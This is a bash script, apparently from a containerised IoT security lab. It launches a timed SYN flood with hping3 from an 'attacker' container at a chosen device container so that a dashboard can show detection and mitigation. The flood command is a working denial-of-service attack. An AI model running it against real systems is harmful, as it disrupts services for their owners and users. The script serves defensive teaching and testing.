#!/bin/bash
# launch_attack.sh - Simulates a DDoS attack from the attacker container

echo "=== Launching DDoS Attack Simulation ==="

# Target device (default: device 1)
TARGET_DEVICE=${1:-1}
TARGET="iot-device-$TARGET_DEVICE"
TARGET_IP=$(docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' $TARGET)

# Attack duration in seconds
DURATION=${2:-30}

echo "Target: $TARGET ($TARGET_IP)"
echo "Attack duration: $DURATION seconds"
echo "Attack type: SYN flood"

# Execute the attack
echo "Starting attack..."
docker exec -d attacker timeout $DURATION hping3 -S --flood -p 80 $TARGET_IP

echo "Attack launched against $TARGET"
echo "The attack will run for $DURATION seconds"
echo "=== Monitor your dashboard to see detection and mitigation ==="
